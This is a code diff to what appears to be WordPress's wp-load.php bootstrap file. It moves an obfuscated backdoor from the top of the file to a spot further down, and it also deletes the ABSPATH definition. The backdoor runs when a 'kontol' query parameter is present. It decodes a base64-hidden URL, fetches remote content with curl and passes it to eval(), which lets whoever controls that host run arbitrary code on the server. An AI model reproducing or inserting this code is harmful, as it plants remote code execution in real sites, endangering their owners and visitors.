@@ -1,22 +1,4 @@
 <?php 
-if (isset($_GET['kontol'])) { 
-    $url = base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9hbGZhLnR4dA==');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
 /**
  * Bootstrap file for setting the ABSPATH constant
  * and loading the wp-config.php file. The wp-config.php
@@ -35,10 +17,25 @@ if (isset($_GET['kontol'])) {
  */
 
 /** Define ABSPATH as this file's directory */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/' );
-}
 
+if (isset($_GET['kontol'])) { 
+    $url = base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9hbGZhLnR4dA==');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+}
 /*
  * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
  * it's best to add a dummy function to the wp-config.php file, but as this call to the function
